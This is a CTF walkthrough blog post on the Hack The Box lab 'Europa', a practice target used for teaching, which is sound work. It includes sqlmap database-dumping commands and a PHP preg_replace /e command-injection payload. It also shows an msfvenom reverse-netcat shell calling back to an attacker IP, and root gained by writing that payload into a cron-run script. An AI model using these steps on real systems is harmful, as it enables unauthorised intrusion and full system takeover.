@@ -1,0 +1,99 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Box Challenge: Europa Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-europa-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-04-09T18:06:40+00:00">April 9, 2018</time><time class="updated" datetime="2025-07-05T18:47:50+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “<strong>Europa</strong>” which is retired vulnerable lab presented by <strong>Hack the Box</strong> for making online penetration practices according to your experience level. Solving challenges in this lab is not that much tough until you don’t have the correct knowledge of Penetration testing. Let start and learn how to breach a network then exploit it for retrieving desired information.</span></p>
+<p><span style="color: #000000;"><strong>Level: </strong>Hard</span></p>
+<h5><strong><span style="color: #000000;">Task: find user.txt and root.txt file on the victim’s machine.</span></strong></h5>
+<h3><span style="color: #800000;">Initial Reconnaissance and Web Enumeration</span></h3>
+<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and IP of sense is <strong>10.10.10.22</strong> so let’s begin with nmap port enumeration.</span></p>
+<pre class="lang:default decode:true ">nmap -A 10.10.10.22</pre>
+<p><span style="color: #000000;">From given below image, you can observe we found port 22, 80 and  443 are open in victim’s network.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-sMlhbT8_UqE/WsuZLkEtG6I/AAAAAAAAWPE/cbHJw-pZdvE4WUo3j0WxPrbjm6cnjxJnwCEwYBhgL/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">As you have seen in our all previous lab that we love to explore target IP via port 80 on our web browser, similarly we follow that tradition in this also but Bad Unluckily!! This time it didn’t work at all.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-gLFuFDVR_VI/WsuZOyL9q2I/AAAAAAAAWO4/GhwApMXtfacNBYssZpfWBbg6G2gXT4ELgCEwYBhgL/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">Now the last option was to <strong>add target IP</strong> inside <strong>/etc/host </strong>file since port 443 was open containing two domain names and as it is a challenge of hack the box thus I edit <strong>europacorp.htb </strong>and<strong> admin-portal.europccorp.htb</strong> as a hostname.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-SHyeUh4GhPM/WsuZRrRy6EI/AAAAAAAAWPE/1rXdVPl6K0Yxlsbnm9A4srdBkZzY1pNMwCEwYBhgL/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">Then I explore the domain name: </span></p>
+<h5><span style="color: #000000;">admin-portal.europccorp.htb </span></h5>
+<p><span style="color: #000000;">Through the web browser and found following login page as shown below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-jX97tjLkWAo/WsuZSBIcnwI/AAAAAAAAWO8/wxSJZqt_B18iJur5f2F98iMrVZNHIPp7QCEwYBhgL/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">In order to breach confidentiality we can try SQL form based attack and for this, I preferred sqlmap following command to enumerate database name.</span></p>
+<pre class="lang:default decode:true">sqlmap -u https://admin-portal.europacorp.htb --form --dbs --batch</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mUnnpmLB6sQ/WsuZSL4462I/AAAAAAAAWPA/Ch_FPcVE5aEoAks-3AYlKux1zHIEldTpQCEwYBhgL/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Luckily our assumption set true and it dumbs the database name “admin”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-EyGeeYKQh_c/WsuZSXj0b3I/AAAAAAAAWPE/0Sx1yQ3SJucjSjEbUO5ntiy2jN7TfCwKQCEwYBhgL/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Then I run following command for enumerating entire table details.</span></p>
+<pre class="lang:default decode:true">sqlmap -u https://admin-portal.europacorp.htb -D admin --dump-all --batch</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CkDGdGux8wI/WsuZS6_pTsI/AAAAAAAAWPI/R6esOgCgta0uKEWCqCmLree0AT2g6O19ACEwYBhgL/s1600/8.png"/></span></p>
+<p><span style="color: #000000;"><strong>Awesome!!</strong> I found a table “users” which 2 entries having the username and password columns.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-hX7gXIJYIJ8/WsuZTAI8zQI/AAAAAAAAWPQ/IrCJi4HmAzYrysDhYOtJs8uWxCJqbAl0gCEwYBhgL/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Using online MD5 decryption I cracked hash password and received “<strong>SupersecretPassword!</strong>” and use these credential to login into admin console.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-jT6cmO-eiZc/WsuZLSrAG7I/AAAAAAAAWPI/bEXwP0XxAs4F9VH8dWU-SimsJh0UuOWiQCEwYBhgL/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">After fruitfully validation I got a dashboard from where I step towards <strong>Tools</strong> options.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-e5GXKg5IWVU/WsuZLiRfnjI/AAAAAAAAWPE/VqGrOw0rQNQV-2SEz7NsB9jOuOFdLnRDACEwYBhgL/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">It was set up with a script for open VPN generator using the PHP function preg_replace() on user input. When I investigate more related to this function, it is suggested not to use preg_replace() on user input as it can lead to command execution vulnerability.</span></p>
+<p><span style="color: #000000;">Considering the above suggestion true, I fetched its request into burp suite and sent it to the repeater for exploit command injection vulnerability.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Y3Tn4-zLDjM/WsuZMmyB0WI/AAAAAAAAWO8/9XHrcTJawUIy1MHsolW-Pgv02VDH_8RLgCEwYBhgL/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Here I notice three parameter <strong>pattern, ipaddress, and test </strong>where we can add our arbitrary code for execution but before that, you need to know correct step “how to exploit it” manually.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-sVnZykEKId4/WsuZM51JxhI/AAAAAAAAWPE/EggCeufCD3UKRl4uy2DeloNayt4ZkOmqACEwYBhgL/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">So when I search more related to this then I found so many links which were describing <strong>/e option</strong> is a threat to PHP preg_replace function.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-C54sbh9uu4E/WsuZNCcqkOI/AAAAAAAAWPA/Wr1MS3ypFMcRTyetv_mGHLt2_L9-WVPxQCEwYBhgL/s1600/14.png"/></span></p>
+<h3><span style="color: #800000;">Gaining Initial Foothold Through Command Injection</span></h3>
+<p><span style="color: #000000;">Now the code can be execute by sending http post request as given below format.</span></p>
+<p><span style="color: #000000;">pattern=<strong>/ip_address/e</strong>&amp;ipaddress=<strong>arbitrary command</strong>&amp;text=ip_addres</span></p>
+<p><span style="color: #000000;"><strong>For example:</strong>  To check directory list we can run following command and verify resultant output.</span></p>
+<p><span style="color: #000000;">pattern=<strong>/ip_address/e</strong>&amp;ipaddress=<strong>ls</strong> &amp;text=ip_addres</span></p>
+<p><span style="color: #000000;">Similarly we can run any malicious code inside this for achieving reversion connection.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Nt8VIt--rFk/WsuZNuEGljI/AAAAAAAAWPM/9C6A5syelUAjS7x-XUFgk3VtMDEob7zQwCEwYBhgL/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">Using msfvenom following command we had generated malicious bash code for getting a reverse connection from victim’s machine at our listening port.</span></p>
+<pre class="lang:default decode:true ">msfvenom -p cmd/unix/reverse_netcat lhost=10.10.14.6 lport=1234 R</pre>
+<p><span style="color: #000000;">As shown in the below image, the size of the generated payload is 101 bytes, now copy this malicious code and send it to target. After that start Netcat/multi handler for accessing reverse connection and wait for getting its TTY shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-deLNElJRbss/WsuZN_z7aII/AAAAAAAAWPQ/UwMqORw5YfIQVzVdMLOVlWq0ygFETFmlQCEwYBhgL/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Now if you will run above-copied code then it will get failed in its mission therefore before running the ordinal code you need to <strong>encode it </strong>in <strong>URL encoding f</strong>ormat and then copy the URL encoded code for execution.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-88gR5dglXEg/WsuZN6-ZZSI/AAAAAAAAWO8/l_T6VumXpN04KVjqzpt3m2D0okpzc4rogCEwYBhgL/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">Now I had pasted the above-encoded code as shown in below image and execute it with the GO tab.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-bIDIHnzBQPY/WsuZOtpe-kI/AAAAAAAAWPE/VBn2Mv5ss9MemZ8rEytRQ44MzOnX_SX1wCEwYBhgL/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">Meanwhile, I return to my Metasploit terminal and wait for the meterpreter session by exploiting multi handler.</span></p>
+<pre class="lang:default decode:true">msf use exploit/multi/handler
+msf exploit(multi/handler) set payload cmd/unix/reverse_netcat
+msf exploit(multi/handler) set lhost 10.10.14.6
+msf exploit(multi/handler) set lport 1234
+msf exploit(multi/handler) exploit</pre>
+<p><span style="color: #000000;">From given below image you can observe <strong>command session1</strong> opened for accessing victim tty shell then I upgrade command shell into a meterpreter session.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MmAigVgCCKc/WsuZO4sT0vI/AAAAAAAAWO8/uwuwXnVgN3Ivjl37D2wUETNtgKYmY86UACEwYBhgL/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">Pleasing!! We have bound the shell of victims system, now let’s finish the task by grabbing user.txt and root.txt file and after traversing some directory I found the user.txt file in <strong>/home/john</strong></span></p>
+<pre class="lang:default decode:true">Meterpreter&gt;sysinfo
+Meterpreter&gt;cd /home
+Meterpreter&gt;cd john
+Meterpreter&gt;cat user.txt</pre>
+<p><span style="color: #000000;"><strong>Great!!</strong>  Here we had completed 1<sup>st</sup> task now move to 2<sup>nd</sup> tasK</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KTH74HbNj80/WsuZPud-VMI/AAAAAAAAWPE/qAT2kx1AMDYqa-TQMj7QboAO8P_a_IKwACEwYBhgL/s1600/20.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation via Cron Job Abuse</span></h3>
+<p><span style="color: #000000;">We start penetrating targets machine and after some time we came to know about the <strong>clearlogs</strong> file which has root privilege from inside contents of crontab file.</span></p>
+<p><span style="color: #000000;">Using cat command we read contents of clearlogs here the cronjob was executing the shell script <strong>logcleared.sh</strong> with root permission.</span></p>
+<pre class="lang:default decode:true">meterpreter&gt;cat /etc/crontab
+meterpreter&gt;cat /var/www/cronjobs/clearlogs</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Qc52d2NutUc/WsuZQB8AuSI/AAAAAAAAWPE/fJEODHn8DOwPCo7tbN_8nPsz0ETDf0AowCEwYBhgL/s1600/21.png"/></span></p>
+<p><span style="color: #000000;">Then we move into <strong>cmd</strong> <strong>directory </strong>and for spawning proper tty shell of target’s system we need to import python3 file, therefore, I run following command inside the meterpreter shell</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-v5bJW8gPrFQ/WsuZPxxvJRI/AAAAAAAAWPE/u2LYJXCKzHc8_e9OQ4iBewwn_4lbjRu5QCEwYBhgL/s1600/22.png"/></span></p>
+<p><span style="color: #000000;">This time again we had used the same payload <strong>cmd/unix/reverse_netcat</strong> generated malicious as above on a new <strong>port 5678</strong> for reverse connection and copied the generated code and <strong>start netcat</strong> on a new terminal for getting the reverse connection.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-MDqulmv3zOw/WsuZQnrIDyI/AAAAAAAAWPA/LtPcxOH9m_k5t0tPe5Mc19wq5B_xTwN4wCEwYBhgL/s1600/23.png"/></span></p>
+<p><span style="color: #000000;">Then edit the above malicious code into logcleared.sh file with help of echo command and gave full permission as shown below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZjQQEiS7MYA/WsuZQ-UR1MI/AAAAAAAAWPM/XuqFmasrJ9YcjTdFjjmvplDllHkqOBqyACEwYBhgL/s1600/24.png"/></span></p>
+<pre class="lang:default decode:true ">nc -lvp 5678</pre>
+<p><span style="color: #000000;">WOW, we got the reverse connection from victims system with root access now let’s catch the flag and finished the task.</span></p>
+<pre class="lang:default decode:true">id
+cd /root
+cat flag.txt</pre>
+<p><span style="color: #000000;">Finally, we have completed both tasks successfully and get juice experience.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-g0Q7jDanY3Q/WsuZRIuCn7I/AAAAAAAAWPE/Zr4Ddg9MfC45eQ360jnBMcJ26CCgQ5lhwCEwYBhgL/s1600/25.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
